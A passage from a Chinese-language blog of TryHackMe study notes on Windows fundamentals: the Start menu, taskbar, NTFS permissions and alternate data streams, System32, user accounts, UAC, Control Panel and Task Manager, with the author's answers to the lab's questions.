<p><em>注意:在远程桌面会话中，某些显示设置将被禁用。</em></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230331184113446.png"
                      alt="image-20230331184113446"
                ></p>
<p>你也可以通过选择“个性化-Personalize”来更改壁纸。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230331183829228.png"
                      alt="image-20230331183829228"
                ></p>
<p>通过“个性化-Personalize”功能，你可以更改桌面的背景图像，以及更改字体、主题、配色方案等。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230331184043358.png"
                      alt="image-20230331184043358"
                ></p>
<p><strong>The Start Menu（开始菜单）</strong></p>
<p>在之前的Windows版本中，桌面GUI的左下角还可以看到“开始-Start ”一词；但是，在Windows 10等现代版本的操作系统中，“开始-Start ”一词不再出现，取而代之的是一个Windows Logo。尽管开始菜单的外观发生了变化，但其总体功能还是和以前一样的。</p>
<p>“开始菜单”为计算机用户提供了对所有最有用的程序、文件、实用工具等的访问，当你点击Windows logo之后，开始菜单就会打开，它将由三个部分共同组成。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230331184759638.png"
                      alt="image-20230331184759638"
                ></p>
<p>**1.**“开始菜单”的第一个部分(Start Menu从左到右的第一个区域)为你对帐户或登录会话的可执行操作提供了快速快捷方式，例如更改用户帐户、锁定屏幕或注销帐户，其他特定于你的帐户的快捷方式还有“文档”文件夹(文档图标)和“图片”文件夹(图片图标)，最后，点击齿轮图标将允许你进入设置屏幕界面，点击电源图标将允许你关闭计算机、重新启动计算机或者断开远程桌面会话(如果存在远程桌面会话)。</p>
<p>如下图所示，你可以看到多个附加了功能的图标，如果你要展开此部分的更多内容，请单击顶部的图标：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230331190016903.png"
                      alt="image-20230331190016903"
                ></p>
<p>**2.**“开始菜单”的第二个部分(Start Menu从左到右的第二个区域)将在顶部显示所有最近添加的程序和所有已安装的程序(可配置为出现在开始菜单中)，在此部分中，应用程序&#x2F;程序将会按字母顺序被列出。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230331190757774.png"
                      alt="image-20230331190757774"
                ></p>
<p>如上图所示，第一个框是最近添加的应用程序&#x2F;程序将出现的地方，第二个框将显示所有已安装的应用程序&#x2F;程序 并且按字母排列。</p>
<p>如果你有一个很长的已安装程序列表，你可以点击字母网格中的字母标题，从而实现跳转到已安装程序列表中的特定部分。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230331191141034.png"
                      alt="image-20230331191141034"
                ></p>
<p><em>注意：上图中的白色字母与已安装程序的字母标题相匹配。</em></p>
<p>**3.**“开始菜单”的第三个部分(Start Menu从左到右的第三个区域)，也就是开始菜单的右侧，此区域是你可以找到特定应用程序&#x2F;程序或者实用程序的图标的地方；这些图标被称为磁贴，一些磁贴在默认情况下会被添加到此区域。</p>
<p>右键单击任何一个磁贴，都会出现一个菜单，这个菜单可以允许你对所选磁贴执行更多操作：例如调整平铺大小，从开始菜单中取消固定，查看其属性等。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230331192202260.png"
                      alt="image-20230331192202260"
                ></p>
<p>在前述的“开始菜单”第二个区域中的应用程序&#x2F;程序，都可以通过右键单击并选择“Pin to Start”以形成新的磁贴，而这些新的磁贴会出现在“开始菜单”的第三个区域中。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230331192854403.png"
                      alt="image-20230331192854403"
                ></p>
<p><strong>The Taskbar（任务栏）</strong></p>
<p>在任务栏中(任务栏一般在桌面GUI的底部)，某些组件是默认启用且可见的，例如，下图中的工具栏（Toolbars）就是为了演示目的而启用的。</p>
<p>如果你想要禁用一些任务栏可用组件，你可以右键单击任务栏，这将弹出一个上下文菜单以允许你进行更改。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230331193428534.png"
                      alt="image-20230331193428534"
                ></p>
<p>所有你已经打开或者启动的任何应用程序&#x2F;程序、文件夹、文件等都会出现在任务栏中。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230331194347701.png"
                      alt="image-20230331194347701"
                ></p>
<p>当你将鼠标悬停在任务栏中的应用程序图标上时，这将提供关于此应用程序的预览运行缩略图以及提示信息，这个提示信息是有用的，如果你打开了很多不同的或者相同的应用&#x2F;程序，如多个谷歌Chrome浏览器界面，你可能会希望找到一个你想要的谷歌Chrome实例，此时你就可以根据提示信息来找到目标实例。</p>
<p>当你关闭应用程序时，相关的应用程序的图标将从任务栏中消失(除非你显式地将应用程序图标固定到任务栏)。</p>
<p><strong>The Notification Area（通知区域）</strong></p>
<p>通知区域通常位于Windows屏幕的右下方，它是显示日期和时间的地方。在通知区域中，你可能看到的其他图标还包括音量图标、网络&#x2F;无线图标、电池状态图标等等，你可以通过任务栏设置来添加或删除通知区域中的图标。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230331195748338.png"
                      alt="image-20230331195748338"
                ></p>
<p>进入任务栏设置界面，然后向下滚动到通知区域部分即可进行更改。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230331195842358.png"
                      alt="image-20230331195842358"
                ></p>
<p>下面是微软官方关于用户桌面GUI中的“开始菜单”和“通知区域”的简要文档。</p>
<ul>
<li><a class="link"   href="https://support.microsoft.com/en-us/windows/see-what-s-on-the-start-menu-a8ccb400-ad49-962b-d2b1-93f453785a13" >https://support.microsoft.com/en-us/windows/see-what-s-on-the-start-menu-a8ccb400-ad49-962b-d2b1-93f453785a13 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://support.microsoft.com/en-us/windows/customize-the-taskbar-notification-area-e159e8d2-9ac5-b2bd-61c5-bb63c1d437c3#WindowsVersion=Windows_10" >https://support.microsoft.com/en-us/windows/customize-the-taskbar-notification-area-e159e8d2-9ac5-b2bd-61c5-bb63c1d437c3#WindowsVersion=Windows_10 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<p>tips：你可以右键单击任何文件夹、文件、应用程序&#x2F;程序的图标来查看更多信息或者对所单击的项目执行相关操作。</p>
<p><strong>答题</strong></p>
<p><em>tips：阅读本小节内容并且访问Windows虚拟机进行探索，然后回答以下问题。</em></p>
<p>访问由实验房间所提供的Windows虚拟机，并进行相关探索。</p>
<p>问题1：哪个选项可以隐藏&#x2F;禁用搜索框？</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230331220154338.png"
                      alt="image-20230331220154338"
                ></p>
<blockquote>
<p>答案1:Hidden</p>
</blockquote>
<p>问题2：哪个选项可以隐藏&#x2F;禁用任务视图按钮？</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230331220607941.png"
                      alt="image-20230331220607941"
                ></p>
<blockquote>
<p>答案2：Show Task View button</p>
</blockquote>
<p>问题3：除了“时钟”和“网络”之外，通知区域中还有哪些其他图标可见？</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230331220953527.png"
                      alt="image-20230331220953527"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230331221057862.png"
                      alt="image-20230331221057862"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230331220827367.png"
                      alt="image-20230331220827367"
                ></p>
<blockquote>
<p>答案3：Action Center</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230331200408557.png"
                      alt="image-20230331200408557"
                ></p>
<h2 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h2><p>在现代版本的Windows中所使用的文件系统是“New Technology File System-新技术文件系统-NT文件系统”，可简称为<a class="link"   href="https://learn.microsoft.com/en-us/windows-server/storage/file-server/ntfs-overview" >NTFS <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p>
<p>在NTFS之前，还有其他文件系统：比如 FAT16&#x2F;FAT32(File Allocation Table-文件分配表)和HPFS(High Performance File System-高性能文件系统)。</p>
<p>现在你仍然可以看到FAT分区的使用，例如，你通常可以在一些USB设备、MicroSD卡中看到FAT分区，但你通常不会在个人Windows电脑或Windows服务器上看到FAT分区。</p>
<p>NTFS也是一种日志文件系统(具有故障恢复能力的文件系统)，当出现故障时，NTFS文件系统可以根据日志文件中所存储的信息 自动修复磁盘上的文件夹&#x2F;文件（这个功能是FAT文件系统所不具备的）。</p>
<p>NTFS解决了以前的文件系统的许多限制，如：</p>
<ul>
<li>支持大于4GB的文件</li>
<li>能够对文件夹和文件设置特定的权限</li>
<li>能够对文件夹和文件进行压缩</li>
<li>支持加密(属于EFS-<a class="link"   href="https://learn.microsoft.com/en-us/windows/win32/fileio/file-encryption" >Encryption File System <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>-加密文件系统)</li>
</ul>
<p>如果你正在运行Windows，你的Windows所安装使用的文件系统是什么?你可以查看操作系统的驱动器属性(右键单击)，通常是C驱动器(<code>C:\</code>)。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230331210623069.png"
                      alt="image-20230331210623069"
                ></p>
<p>关于文件系统的概述，你可以阅读 Microsoft <a class="link"   href="https://docs.microsoft.com/en-us/troubleshoot/windows-client/backup-and-storage/fat-hpfs-and-ntfs-file-systems" >关于 FAT、HPFS 和 NTFS 的官方文档 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p>
<p>接下来，让我们简要谈谈 NTFS 特有的一些功能。</p>
<p>在 NTFS volumes(volumes–磁盘“卷标”)上，你可以设置授予访问或者拒绝访问文件、文件夹的权限，具体的权限有：</p>
<ul>
<li><strong>Read-读</strong></li>
<li><strong>Write-写</strong></li>
<li><strong>Read &amp; Execute-读、执行</strong></li>
<li><strong>List folder contents-列出文件夹内容</strong></li>
<li><strong>Modify-修改</strong></li>
<li><strong>Full control-完全控制</strong></li>
</ul>
<p>下图列出了每个权限的含义以及这些权限如何应用于文件和文件夹。 （出自<a class="link"   href="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/bb727008(v=technet.10)?redirectedfrom=MSDN" >微软官方文档-文件和文件夹权限 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230331211513652.png"
                      alt="image-20230331211513652"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230331211943792.png"
                      alt="image-20230331211943792"
                ></p>
<p>如何查看文件或文件夹的权限？</p>
<ol>
<li><p>右键单击要检查权限的文件或文件夹。</p>
</li>
<li><p>在弹出的上下文菜单中单击选择“属性”（<code>Properties</code>）。</p>
</li>
<li><p>在“属性”中，单击“安全”（<code>Security</code>）选项卡。</p>
</li>
<li><p>在组或用户名（<code>Group or user names</code>）列表中，选择要查看其权限的用户、计算机或组。</p>
</li>
</ol>
<p>在下图中，你可以看到 Windows 文件夹的用户(<code>Users</code>)组的权限。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230331213944033.png"
                      alt="image-20230331213944033"
                ></p>
<p>NTFS 文件系统的另一个特性是备用数据流 (ADS-Alternate Data Streams)。</p>
<p>备用数据流(ADS)是特定于Windows NTFS(New Technology File System-新技术文件系统)的文件属性。</p>
<p>每个文件都至少有一个数据流(<code>$DATA</code>)，而ADS（备用数据流）将允许文件包含多个数据流。本机<a class="link"   href="https://support.microsoft.com/en-us/windows/what-s-changed-in-file-explorer-ef370130-1cca-9dc5-e0df-2f7416fe1cb1" >Windows文件资源管理器 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>并不会向用户显示ADS（备用数据流），你可以使用第三方可执行文件来查看ADS（备用数据流），或者你也可以选择使用<a class="link"   href="https://learn.microsoft.com/en-us/powershell/scripting/overview?view=powershell-7.3&viewFallbackFrom=powershell-7.1" >Powershell <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 来查看文件的ADS（备用数据流）。</p>
<p>从安全的角度来看，恶意软件编写者会使用ADS来隐藏数据，但是这并非意味着所有的ADS使用都是恶意的；例如，当你从Internet(互联网)下载一个文件时，会向ADS写入标识符，以识别该文件确实是从Internet下载的。</p>
<p>要了解更多关于ADS的知识，请参考<a class="link"   href="https://www.malwarebytes.com/blog/news/2015/07/introduction-to-alternate-data-streams" >MalwareBytes所提供的相关文档 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p>
<p><strong>答题</strong></p>
<p><em>tips：通过阅读本小节内容即可回答以下问题。</em></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230331222543571.png"
                      alt="image-20230331222543571"
                ></p>
<h2 id="Windows-System32文件夹"><a href="#Windows-System32文件夹" class="headerlink" title="Windows\System32文件夹"></a>Windows\System32文件夹</h2><p>Windows文件夹(<code>C:\Windows</code>)通常被称为包含Windows操作系统的文件夹。</p>
<p>这个文件夹不一定要位于C盘，它可以驻留在任何其他磁盘驱动器中，在技术上还可以实现驻留在不同的文件夹中；这就是环境变量，更具体地说是系统环境变量能够发挥作用的地方，Windows文件夹(目录)的系统环境变量是<code>%windir%</code>。</p>
<p>根据<a class="link"   href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_environment_variables?view=powershell-7.1" >微软相关文档 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>：“环境变量存储着有关操作系统环境的信息，这些信息包括操作系统路径、操作系统使用的处理器数量以及临时文件夹的位置等详细信息。”</p>
<p>在“Windows”文件夹中有很多文件夹：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230331224546618.png"
                      alt="image-20230331224546618"
                ></p>
<p>其中一个文件夹是System32：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230331224616743.png"
                      alt="image-20230331224616743"
                ></p>
<p>System32文件夹中保存着一些对操作系统至关重要的文件，在与此文件夹交互时，你应该要非常谨慎，不小心删除System32中的任何文件或者文件夹都可能会导致Windows操作系统无法正常操作。</p>
<p>可参考资料：<a class="link"   href="https://www.howtogeek.com/346997/what-is-the-system32-directory-and-why-you-shouldnt-delete-it/" >https://www.howtogeek.com/346997/what-is-the-system32-directory-and-why-you-shouldnt-delete-it/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>注意：Windows基础所涉及的许多工具都位于System32文件夹中。</p>
<p><strong>答题</strong></p>
<p><em>tips：通过阅读本小节内容即可回答以下问题。</em></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230331224902472.png"
                      alt="image-20230331224902472"
                ></p>
<h2 id="用户帐户、配置文件和权限"><a href="#用户帐户、配置文件和权限" class="headerlink" title="用户帐户、配置文件和权限"></a>用户帐户、配置文件和权限</h2><p>在典型的本地Windows系统上，用户帐户可以是以下两种类型之一：管理员（Administrator）和标准用户（Standard User）。</p>
<p>用户帐户的类型将决定用户可以在特定的Windows系统上执行什么操作。</p>
<ul>
<li>管理员可以对系统进行更改，如添加用户、删除用户、修改组、修改系统设置等。</li>
<li>标准用户只能对归属于该用户的文件夹&#x2F;文件进行更改，不能执行系统级更改。</li>
</ul>
<p>假设你当前以管理员身份登录到Windows机器，你可以通过一些方法来确定当前系统上存在哪些用户帐户。</p>
<p>你可以单击<code>Start Menu</code>并输入<code>Other User</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230331230819292.png"
                      alt="image-20230331230819292"
                ></p>
<p>如果你点击上图中的<code>Other Users</code>，则应该会出现一个设置窗口：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230331230932138.png"
                      alt="image-20230331230932138"
                ></p>
<p>由于你现在是管理员，你将能够看到一个将其他人添加到此PC的选项（Add someone else to this PC）。</p>
<p><em>注意：标准用户将看不到此选项。</em></p>
<p>继续单击本地用户帐户，此时应该会出现更多选项：更改帐户类型和删除。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230331231440182.png"
                      alt="image-20230331231440182"
                ></p>
<p>单击上图中的Change account type，下拉框中的当前值即表示当前的帐户类型。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230331231216995.png"
                      alt="image-20230331231216995"
                ></p>
<p>当系统创建用户帐户时，将同时为该用户创建一个配置文件，每个用户配置文件的文件夹位置将落在<code>C:\Users</code>下；例如，用户帐号Max的用户配置文件所在的文件夹为<code>C:\Users\Max</code>。</p>
<p>用户配置文件的创建会在用户账户初次登录时完成。</p>
<p>当一个新用户帐户第一次登录到本地系统时，他将在登录屏幕上看到几条消息，其中一条消息User Profile Service会在登录屏幕上停留一段时间，这表示它正在创建相关的用户配置文件。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230331231928100.png"
                      alt="image-20230331231928100"
                ></p>
<p>一旦登录成功，用户将看到一个类似于下面的对话框，这表明配置文件正在创建中。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230331232138839.png"
                      alt="image-20230331232138839"
                ></p>
<p>每个用户配置文件都会有一些相同的文件夹，其中的一些是：</p>
<ul>
<li>Desktop</li>
<li>Documents</li>
<li>Downloads</li>
<li>Music</li>
<li>Pictures</li>
</ul>
<p>访问用户账户信息的另一种方法是使用本地用户和组管理界面（ Local User and Group Management）。</p>
<p>你可以右键单击“开始菜单- Start Menu”并单击Run，然后输入<code>lusrmgr.msc</code>：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230331233204501.png"
                      alt="image-20230331233204501"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230331233318791.png"
                      alt="image-20230331233318791"
                ></p>
<p><em>注意：Run对话框可以允许我们快速打开项目。</em></p>
<p>使用Run对话框并访问<code>lusrmgr.msc</code>之后，我们就进入到了“本地用户和组管理”界面，在这个界面，你可以看到两个文件夹：Users和Groups。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230331233829846.png"
                      alt="image-20230331233829846"
                ></p>
<p>如果单击Groups，你将看到所有本地组的名称以及每个组的简要描述。每个组都有其权限，计算机用户将由管理员分配&#x2F;添加到组中，当用户被分配到某个组时，该用户将会继承该组的权限，并且一个用户可以被分配给多个组。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230331234311751.png"
                      alt="image-20230331234311751"
                ></p>
<p><em>注意：如果你从“其他用户-Other users”中单击“将其他人添加到此PC”，这将自动打开一个“本地用户和组管理”界面。</em></p>
<p><strong>答题</strong></p>
<p><em>tips：阅读本小节内容并且访问Windows虚拟机进行探索，然后回答以下问题。</em></p>
<p>访问由实验房间所提供的Windows虚拟机，并进行相关探索。</p>
<p>查看Other users账户：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230331235802326.png"
                      alt="image-20230331235802326"
                ></p>
<p>使用<code>win + r</code>打开Run对话框，然后输入<code>lusrmgr.msc</code>并点击确定，成功进入到“本地用户和组管理”界面：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230401000117411.png"
                      alt="image-20230401000117411"
                ></p>
<blockquote>
<p>Other users所对应的账户Name为：tryhackmebilly</p>
</blockquote>
<p>查看这个用户(tryhackmebilly)属于哪个组：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230401000445572.png"
                      alt="image-20230401000445572"
                ></p>
<blockquote>
<p>tryhackmebilly用户属于：Remote Desktop Users组和Users组。</p>
</blockquote>
<p>查看用于来宾用户访问的内置帐户：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230401000749028.png"
                      alt="image-20230401000749028"
                ></p>
<blockquote>
<p>用于来宾用户访问的内置帐户是：Guest</p>
</blockquote>
<p>查看来宾用户帐户的帐户状态：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230401001211417.png"
                      alt="image-20230401001211417"
                ></p>
<blockquote>
<p>帐户状态为：Account is disabled</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230331234547668.png"
                      alt="image-20230331234547668"
                ></p>
<h2 id="用户帐户控制"><a href="#用户帐户控制" class="headerlink" title="用户帐户控制"></a>用户帐户控制</h2><p>大多数家庭用户都以本地管理员身份登录到他们的 Windows 系统，而帐户类型为管理员的用户可以对系统进行任意更改。</p>
<p>计算机用户在执行某些操作时，其实并不需要系统为这些操作分配一个很高的权限，例如网上冲浪、处理 Word 文档等；这种提升的权限增加了系统被攻破的风险，也使得恶意软件更容易感染系统（因为这可能会使恶意软件在一个较高的权限下得到运行）。</p>
<p>为了保护本地用户的权限分配安全，Microsoft 引入了用户帐户控制机制(UAC-User Account Control)，这个概念最初是在<a class="link"   href="https://en.wikipedia.org/wiki/Windows_Vista" >Windows Vista <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>系统中引入的，并且在随后的 Windows 版本中也得到继续使用。</p>
<p>注意：UAC在默认情况下不适用于内置的本地管理员帐户。 </p>
<p>UAC是如何工作的？当具有管理员帐户类型的用户登录系统时，当前会话并不会以提升的权限运行(此时用户具有管理员权限，无需再提升)；当具有标准帐户类型的用户登录系统时，如果用户想要执行一些需要更高级别权限的操作时，UAC机制会提示用户是否允许执行 并可能需要我们输入管理员密码。 </p>
<p>我们可以查看当前所登录的帐户（假设为内置管理员帐户）上的程序信息——右键单击程序并查看其属性即可。</p>
<p>在程序属性的“安全-Security ”选项卡中，我们可以看到该程序所属的用户&#x2F;组以及它们对此程序文件的权限（从下图可知：标准用户没有被列出）。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230401081039434.png"
                      alt="image-20230401081039434"
                ></p>
<p>如果我们以标准用户登录并尝试运行上图中的程序，那么就会触发UAC机制。</p>
<p>注意：当我们以管理员帐户登录之后，可以通过lusrmgr.msc界面查看到标准用户的用户名和密码(知道用户名和密码之后，我们就能通过远程桌面进行登录)。</p>
<p>当我们作为标准用户登录时，上述可执行程序的默认图标上会有一个盾牌标志。程序上的盾牌标志代表该程序受UAC限制，当我们点击运行该程序时，会提示是否允许以更高级别的权限运行。（如果要继续运行该程序，就需要我们输入管理员密码）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230401083931178.png"
                      alt="image-20230401083931178"
                ></p>
<p>双击上图中的程序，你将看到UAC提示（此时需要输入管理员帐户的密码，然后才能继续运行该程序）。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230401084355843.png"
                      alt="image-20230401084355843"
                ></p>
<p>一段时间无操作之后，上图中的UAC提示符就会消失，然后程序就不会运行。</p>
<p>UAC功能降低了恶意软件成功破坏系统的可能性，你可以阅读<a class="link"   href="https://learn.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works" >微软官方文档 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>了解更多关于UAC的信息。</p>
<p><strong>答题</strong></p>
<p><em>tips：通过阅读本小节内容即可回答以下问题。</em></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230401085221414.png"
                      alt="image-20230401085221414"
                ></p>
<h2 id="设置和控制面板"><a href="#设置和控制面板" class="headerlink" title="设置和控制面板"></a>设置和控制面板</h2><p>在Windows系统上，进行系统更改的主要位置是“设置菜单”和“控制面板”。</p>
<p>长期以来，“控制面板”一直是进行系统更改(如添加打印机、卸载程序等)的首选位置；而“设置菜单”是在Windows 8 版本中引入的，此版本是第一个适用于触摸屏平板电脑的Windows操作系统，而且“设置菜单”在Windows 10中也仍然可用。事实上，如果用户现在想要进行系统更改，“设置菜单”将会是用户所使用的主要位置。</p>
<p>“设置菜单”和“控制面板”既有相似之处，也有不同之处。</p>
<p><strong>设置菜单</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230401090019326.png"
                      alt="image-20230401090019326"
                ></p>
<p><strong>控制面板</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230401090327928.png"
                      alt="image-20230401090327928"
                ></p>
<p>注意：如果个人计算机设备上的Windows操作系统版本不同，那么“设置菜单”中的图标也可能不同。</p>
<p>设置菜单和控制面板都可以通过开始菜单进行访问。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230401090517708.png"
                      alt="image-20230401090517708"
                ></p>
<p>控制面板能够让你访问更复杂的设置和执行更复杂的操作。在某些情况下，当你使用“设置菜单”开始进行系统更改时，最后还是会进入到“控制面板”中的相关界面。</p>
<p>例如，你可以在“设置菜单”中单击“网络和Internet”，然后再单击“更改适配器选项”。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230401090924855.png"
                      alt="image-20230401090924855"
                ></p>
<p>然后你就会注意到：接下来所弹出的窗口来自于控制面板。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230401091210493.png"
                      alt="image-20230401091210493"
                ></p>
<p>如果你不清楚在更改设置时应该打开设置菜单还是控制面板，你可以使用开始菜单并进行搜索。</p>
<p>在下面的例子中，正在搜索的内容是“wallpaper”，并且最后得到的返回结果会很少。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230401091556674.png"
                      alt="image-20230401091556674"
                ></p>
<p>如果我们点击上图中的“最佳匹配”，将会出现一个“设置”菜单窗口，能够让我们对壁纸进行更改。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230401091737337.png"
                      alt="image-20230401091737337"
                ></p>
<p><strong>答题</strong></p>
<p><em>tips：阅读本小节内容并且访问Windows虚拟机进行探索，然后回答以下问题。</em></p>
<p>访问由实验房间所提供的Windows虚拟机，并进行相关探索。</p>
<p>进入到控制面板界面，将视图更改为小图标显示，查看最后一项设置名称：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230401093612966.png"
                      alt="image-20230401093612966"
                ></p>
<blockquote>
<p>最后一项设置名称为：Windows Defender Firewall 。</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230401091808960.png"
                      alt="image-20230401091808960"
                ></p>
<h2 id="任务管理器"><a href="#任务管理器" class="headerlink" title="任务管理器"></a>任务管理器</h2><p>本文所涉及的最后一个主题是任务管理器。</p>
<p>任务管理器可以提供 有关当前在系统上运行的应用程序和进程的信息，任务管理器中还有一些其他信息也是可用的，比如正在使用多少CPU和RAM，这是属于系统性能的部分。</p>
<p>你可以通过右键单击任务栏来访问任务管理器。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230401092305061.png"
                      alt="image-20230401092305061"
                ></p>
<p>任务管理器界面将会以一个简单视图的形式打开，视图中可能并不会显示太多信息。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230401092416660.png"
                      alt="image-20230401092416660"
                ></p>
<p>我们可以单击上图中的<code>More details</code>，然后视图内容将会发生变化。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230401092538793.png"
                      alt="image-20230401092538793"
                ></p>
<p>有关任务管理器的更多内容，请参阅以下博客文章：</p>
<blockquote>
<p><a class="link"   href="https://www.howtogeek.com/405806/windows-task-manager-the-complete-guide/" >https://www.howtogeek.com/405806/windows-task-manager-the-complete-guide/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://www.howtogeek.com/66622/stupid-geek-tricks-6-ways-to-open-windows-task-manager/" >https://www.howtogeek.com/66622/stupid-geek-tricks-6-ways-to-open-windows-task-manager/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<p><strong>答题</strong></p>
<p><em>tips：通过阅读上述链接相关的博客文章，可回答下面问题。</em></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230401092709123.png"
                      alt="image-20230401092709123"
                ></p>
]]></content>
      <categories>
        <category>TryHackMe笔记</category>
      </categories>
      <tags>
        <tag>TryHackMe</tag>
        <tag>网络安全基础</tag>
        <tag>BlueTeam</tag>
      </tags>
  </entry>
  <entry>
    <title>THM-Windows Fundamentals 2(Windows基础知识2)-学习</title>
    <url>/2024/01/27/THM-Windows%20Fundamentals%202(Windows%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%862)-%E5%AD%A6%E4%B9%A0/</url>
